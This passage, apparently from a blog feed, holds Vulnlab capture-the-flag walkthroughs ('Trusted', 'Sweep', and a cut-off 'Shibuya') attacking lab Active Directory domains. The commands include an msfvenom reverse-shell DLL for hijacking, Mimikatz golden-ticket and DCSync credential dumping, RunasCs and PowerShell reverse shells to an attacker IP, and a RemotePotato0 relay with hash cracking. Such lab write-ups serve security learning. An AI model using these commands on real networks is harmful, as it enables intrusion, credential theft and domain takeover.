&quot;HelloWorld123@&quot;</span><br></pre></td></tr></table></figure><p>Connecting with the new credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i labdc.lab.trusted.vl -u ewalters -p HelloWorld123@</span><br></pre></td></tr></table></figure><p>In the C:\AVTest directory, found an interesting readme:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type readme.txt</span><br><span class="line">Since none of the AV Tools we tried here in the lab satisfied our needs it&#x27;s time to clean them up.</span><br><span class="line">I asked Christine to run them a few times, just to be sure.</span><br><span class="line"></span><br><span class="line">Let&#x27;s just hope we don&#x27;t have to set this lab up again because of this.</span><br></pre></td></tr></table></figure><h2 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h2><p>Transferred the KasperskyRemovalTool.exe to analyze:<br>On Linux:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver smb /mnt -smb2support</span><br></pre></td></tr></table></figure><p>On Windows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\KasperskyRemovalTool.exe \\10.8.5.195\smb\KasperskyRemovalTool.exe</span><br></pre></td></tr></table></figure><p>Analyzed the executable with Process Monitor to identify DLL injection opportunities:</p><p>Set up filters for:</p><ol><li>Process Name</li><li>Path containing .dll</li><li>Result containing “NAME NOT FOUND”</li></ol><p><img src="/images/Trusted/filter_name.png" alt="Filter Name"><br><img src="/images/Trusted/dllfilter.png" alt="DLL Filter"><br><img src="/images/Trusted/FINAL_FILTER.png" alt="Final Filter"><br>Process Monitor revealed that the executable attempts to load a DLL named <code>KasperskyRemovalToolENU.dll</code> from the current directory:<br><img src="/images/Trusted/DLL_injection.png" alt="DLL Injection Opportunity"><br>Created a malicious DLL with the same name containing a reverse shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f dll &gt; KasperskyRemovalToolENU.dll</span><br></pre></td></tr></table></figure><p>Set up SMB server to transfer the file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver smb /mnt -smb2support</span><br></pre></td></tr></table></figure><p>Copied the malicious DLL to the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.8.5.195\smb\KasperskyRemovalToolENU.dll .\KasperskyRemovalToolENU.dll</span><br></pre></td></tr></table></figure><p>After executing the Kaspersky tool, received a reverse shell:<br><img src="/images/Trusted/gotshell.png" alt="Got Shell"></p><h2 id="Privilege-Escalation-via-Domain-Trust-Abuse"><a href="#Privilege-Escalation-via-Domain-Trust-Abuse" class="headerlink" title="Privilege Escalation via Domain Trust Abuse"></a>Privilege Escalation via Domain Trust Abuse</h2><p>Uploaded Mimikatz to map domain trust and forge a golden ticket:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::trust /patch</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/domain_trust.png" alt="Domain Trust"><br>Extracted the krbtgt hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:lab.trusted.vl /all</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/krbtgthash.png" alt="KRBTGT Hash"></p><p>Gathered the following information:</p><ol><li>LAB.TRUSTED.VL SID: S-1-5-21-2241985869-2159962460-1278545866</li><li>TRUSTED.VL SID: S-1-5-21-3576695518-347000760-3731839591 + 519</li><li>krbtgt hash: c7a03c565c68c6fac5f8913fab576ebd</li></ol><p>Created a golden ticket to exploit the trust relationship:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /rc4:c7a03c565c68c6fac5f8913fab576ebd /service:krbtgt /target:trusted.vl /ticket:trustkey.kirbi ptt</span><br></pre></td></tr></table></figure><p>Performed a DCSync attack to extract all domain credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/trusted_admin.png" alt="Trusted Admin"></p><h2 id="Final-Privilege-Escalation"><a href="#Final-Privilege-Escalation" class="headerlink" title="Final Privilege Escalation"></a>Final Privilege Escalation</h2><p>Since we couldn’t directly access the <code>root.txt</code> file without administrator context, we changed the Administrator password and used RunasCs to get a shell with administrative privileges:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Administrator HelloWorld123@</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe Administrator &#x27;HelloWorld123@&#x27; cmd.exe -r &#x27;10.8.5.195:443&#x27;</span><br></pre></td></tr></table></figure><p>This provided us with full administrative access to the domain, completing the penetration test.<br><a href="https://api.vulnlab.com/api/v1/share?id=009839ab-3a10-4656-8b08-522ca143c36b">Vulnlab Cert</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
            <tag> Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Sweep</title>
      <link href="/2025/04/11/VL-Sweep/"/>
      <url>/2025/04/11/VL-Sweep/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>First, I conducted a port scan to identify open services on the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE           REASON          VERSION</span><br><span class="line">53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">81/tcp    open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">82/tcp    open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?     syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?         syn-ack ttl 127</span><br><span class="line">636/tcp   open  ldapssl?          syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: SWEEP</span><br><span class="line">|   NetBIOS_Domain_Name: SWEEP</span><br><span class="line">|   NetBIOS_Computer_Name: INVENTORY</span><br><span class="line">|   DNS_Domain_Name: sweep.vl</span><br><span class="line">|   DNS_Computer_Name: inventory.sweep.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-10T22:49:54+00:00</span><br><span class="line">5357/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49675/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49682/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49718/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><p>I discovered that Lansweeper was running on port 81:<br><img src="/images/Sweep/lansweeper.png" alt="Lansweeper login page"></p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>During enumeration, I discovered that the target was vulnerable to null session authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.124.231 -u &#x27;panos&#x27; -p &#x27;&#x27; --shares --users</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/guest_account.png" alt="Guest account discovered"><br>I used <code>lookupsid</code> to enumerate valid usernames from the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid sweeper.vl/panos:&#x27;&#x27;@sweeper.vl -target 10.10.124.231 -no-pass </span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/sidlookup.png" alt="SID lookup results"><br>The ‘intern’ account looked suspicious. I tried using the credentials ‘intern:intern’ on the Lansweeper login page and gained access:<br><img src="/images/Sweep/intern.png" alt="Successful intern login"></p><h2 id="Privilege-Escalation-User"><a href="#Privilege-Escalation-User" class="headerlink" title="Privilege Escalation - User"></a>Privilege Escalation - User</h2><p>With access to the ‘intern’ account, I enumerated SMB shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.124.231 -u &#x27;intern&#x27; -p &#x27;intern&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/smb_intern.png" alt="SMB shares available to intern"><br>I examined the Lansweeper share but didn’t find anything immediately useful:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.124.231/Lansweeper$ -U intern</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/lansweeper_share.png" alt="Lansweeper share contents"><br>Next, I used BloodHound to map the Active Directory environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.124.231 -u &#x27;intern&#x27; -p &#x27;intern&#x27; --bloodhound --dns-server 10.10.124.231 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/bloodhound_enum.png" alt="BloodHound enumeration"><br>Two accounts stood out as particularly interesting: <code>svc_inventory_lnx</code> and <code>jgre808</code>.</p><h2 id="Exploiting-Lansweeper"><a href="#Exploiting-Lansweeper" class="headerlink" title="Exploiting Lansweeper"></a>Exploiting Lansweeper</h2><p>After logging in with intern:intern credentials, I explored the Lansweeper dashboard. I noticed that the account for Linux scanning had valid credentials, so I created a plan to intercept these credentials.<br>First, I created a scanning target pointing to my attack machine:<br><img src="/images/Sweep/scan_our.png" alt="Creating a scan target"><br>Then I set up a new mapping credential that would cause the Linux scan service account to connect to my machine:<br><img src="/images/Sweep/addit.png" alt="Adding credential mapping"><br>I also ensured my machine was marked as a Linux asset in the system:<br><img src="/images/Sweep/machine_linux.png" alt="Setting machine type to Linux"><br>Using <a href="https://github.com/fffaraz/fakessh">fakessh</a> tool, I captured the username and password of the scanning service account when it attempted to connect to my machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakessh ./</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/creds_svc.png" alt="Captured service account credentials"></p><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Now with the <code>svc_inventory_lnx</code> credentials, I discovered this account had “GenericAll” privileges over the “LANSWEEPER ADMINS” group. I added the service account to this privileged group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host sweep.vl -u &#x27;svc_inventory_lnx&#x27; -p &#x27;&lt;PASS&gt;&#x27; -d &#x27;sweep.vl&#x27; add groupMember &#x27;LANSWEEPER ADMINS&#x27; svc_inventory_lnx</span><br></pre></td></tr></table></figure><p>With elevated privileges, I connected to the target using WinRM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sweep.vl -u svc_inventory_lnx -p &#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p>I was then able to access the user flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; type user.txt</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Administrator"><a href="#Privilege-Escalation-Administrator" class="headerlink" title="Privilege Escalation - Administrator"></a>Privilege Escalation - Administrator</h2><p>For the final privilege escalation, I logged into the Lansweeper application with the <code>svc_inventory_lnx</code> account, which now had administrative access.<br>I created another mapping credential targeting a Windows machine:<br><img src="/images/Sweep/new_map_cred.png" alt="New mapping credential for Windows"><br>Under the Deployment section, I created a new package that would allow me to execute commands on the target machine:<br><img src="/images/Sweep/hacked2.png" alt="Creating deployment package"><br>For the payload, I used a PowerShell reverse shell from <a href="https://www.revshells.com/">revshells.com</a> (PowerShell #2 option):<br><img src="/images/Sweep/deployment.png" alt="Setting up deployment payload"><br>After clicking “Deploy Now” and selecting the appropriate asset:<br><img src="/images/Sweep/asset_select.png" alt="Asset selection"><br>I received a reverse shell with administrator privileges, completing the compromise:<br><img src="/images/Sweep/root.png" alt="Root access achieved"><br>Share URL: <a href="https://api.vulnlab.com/api/v1/share?id=09c407ea-4484-4143-9d7b-866afabd26b4">https://api.vulnlab.com/api/v1/share?id=09c407ea-4484-4143-9d7b-866afabd26b4</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Shibuya</title>
      <link href="/2025/04/11/VL-Shibuya/"/>
      <url>/2025/04/11/VL-Shibuya/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><p>Initial port scan revealed multiple open ports indicating an Active Directory environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|   Target_Name: SHIBUYA</span><br><span class="line">|   NetBIOS_Domain_Name: SHIBUYA</span><br><span class="line">|   NetBIOS_Computer_Name: AWSJPDC0522</span><br><span class="line">|   DNS_Domain_Name: shibuya.vl</span><br><span class="line">|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl</span><br><span class="line">|   DNS_Tree_Name: shibuya.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-09T09:02:13+00:00</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49939/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49965/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49997/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>First, I checked for null sessions, but access was denied:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;hello&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/no_null.png" alt="SMB Null Session Attempt"></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>I used Kerbrute to identify valid users in the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum --dc 10.10.82.222 -d shibuya.vl /usr/share/wordlists/seclists/Usernames/Names/names.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/valid_user.png" alt="Valid User Discovery"></p><h2 id="Exploiting-Pre-created-Machine-Account"><a href="#Exploiting-Pre-created-Machine-Account" class="headerlink" title="Exploiting Pre-created Machine Account"></a>Exploiting Pre-created Machine Account</h2><p>I discovered a machine account named <code>RED$</code> which was pre-created. According to Microsoft documentation, these accounts can have their passwords changed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/precreated_m.png" alt="Pre-created Machine Account"><br>We can authenticate using Kerberos:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares --kerberos</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/kerberos_auth.png" alt="Kerberos Authentication"><br>I changed the password for easier access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;shibuya.vl/RED$&#x27;:red@shibuya.vl -newpass &#x27;HelloWorld123@&#x27; -dc-ip AWSJPDC0522.shibuya.vl -p rpc-samr</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/pass_change.png" alt="Password Change"></p><h2 id="Share-Access-and-Enumeration"><a href="#Share-Access-and-Enumeration" class="headerlink" title="Share Access and Enumeration"></a>Share Access and Enumeration</h2><p>With our new credentials, I connected to the shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/users -U &#x27;RED$&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/smb_access.png" alt="SMB Access"><br>Found users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">All Users</span><br><span class="line">Default</span><br><span class="line">Default User</span><br><span class="line">nigel.mills</span><br><span class="line">simon.watson</span><br></pre></td></tr></table></figure><h2 id="Service-Account-Discovery"><a href="#Service-Account-Discovery" class="headerlink" title="Service Account Discovery"></a>Service Account Discovery</h2><p>I enumerated users and found an interesting service account with credentials in the description:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;HelloWorld123@&#x27; --users</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/svc_account.png" alt="Service Account"><br>Found credentials: <code>svc_autojoin : &lt;HELLNO&gt;</code><br>Using these credentials allowed access to more shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;svc_autojoin&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/more_shares.png" alt="More Shares"></p><h2 id="Registry-Hive-Extraction"><a href="#Registry-Hive-Extraction" class="headerlink" title="Registry Hive Extraction"></a>Registry Hive Extraction</h2><p>I connected to an images share with potentially useful data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/images_share.png" alt="Images Share"><br>I extracted a Windows Image (WIM) file containing registry hives:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27; -c &#x27;timeout 120; iosize 16384; get \AWSJPWK0222-02.wim&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wimmountrw AWSJPWK0222-02.wim 1 /mnt/wim_mount</span><br></pre></td></tr></table></figure><p>After mounting, I extracted the SAM, SYSTEM, and SECURITY hives and ran secretsdump:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/hives.png" alt="Registry Hives"><br>From the output, I found interesting hashes, including an operator hash and a cached domain logon:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56)</span><br></pre></td></tr></table></figure><h2 id="Gaining-User-Access"><a href="#Gaining-User-Access" class="headerlink" title="Gaining User Access"></a>Gaining User Access</h2><p>The hash for Simon didn’t work directly, but password spraying with the operator hash worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/simon.watson.png" alt="Simon Watson Access"><br>While WinRM didn’t work, I remembered port 22 (SSH) was open. I uploaded an SSH key via SMB to gain shell access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f simon</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;mkdir simon.watson/.ssh; put /home/kali/.ssh/simon.w.pub simon.watson/.ssh/authorized_keys&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/simon Simon.Watson@10.10.94.60</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/ssh_access.png" alt="SSH Access"></p><h2 id="Active-Directory-Reconnaissance"><a href="#Active-Directory-Reconnaissance" class="headerlink" title="Active Directory Reconnaissance"></a>Active Directory Reconnaissance</h2><p>I uploaded SharpHound to collect AD data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpHound.exe -c All</span><br></pre></td></tr></table></figure><p>Downloaded the results for analysis:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;get &quot;simon.watson/20250410065413_BloodHound.zip&quot; Shibuya_BloodHound.zip&#x27;</span><br></pre></td></tr></table></figure><h2 id="Cross-Session-Relay-Attack"><a href="#Cross-Session-Relay-Attack" class="headerlink" title="Cross-Session Relay Attack"></a>Cross-Session Relay Attack</h2><p>BloodHound analysis revealed two users with active sessions: Simon.Watson (which we already owned) and Nigel.Mills. I decided to perform a cross-session relay attack to compromise Nigel.Mills’s account.<br><img src="/images/Shibuya/crossseionattack.png" alt="Cross Session Attack"><br>First, I uploaded RemotePotato0 (which evades antivirus detection):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash 5d8c3d1a20bd63f60f469f6763ca0d50 -c &#x27;put /home/panosoiko/Downloads/RemotePotato0.exe simon.watson/RemotePotato0.exe&#x27;</span><br></pre></td></tr></table></figure><p>On the victim machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1 -x 10.8.5.195 -p 8080</span><br></pre></td></tr></table></figure><p>On the attacker machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.78.105:8080</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/nigel.mills.png" alt="Nigel Mills Access"><br>I cracked the captured hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash322.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: <code>nigel.mills : Sail2.......</code></p><h2 